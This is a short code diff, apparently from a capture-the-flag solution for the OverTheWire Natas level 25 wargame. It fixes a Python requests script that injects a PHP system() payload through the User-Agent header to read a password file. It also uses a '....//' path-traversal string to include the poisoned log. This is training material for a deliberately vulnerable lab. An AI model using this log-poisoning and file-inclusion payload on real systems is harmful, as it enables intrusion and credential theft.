@@ -1294,15 +1294,15 @@ url = 'http://natas25.natas.labs.overthewire.org'
 session = requests.Session()
 
 newHeaders = {
-    "user-Agent" : "?php system('cat /etc/natas_webpass/natas26'); ?>"
+    "user-Agent" : "<?php system('cat /etc/natas_webpass/natas26'); ?>"
 }
-response = session.get(url, auth=(username, password))
+response = session.get(url, auth = (username, password))
 sessionID = response.cookies['PHPSESSID']
 
 response = session.post(
     url,
     auth = (username, password), data = {
-         "lang" : "....//....//....//var/www/natas_webpass/natas26/logs/n"
+         "lang" : "....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/natas_webpass/natas26/logs/n"
     }
 )
 
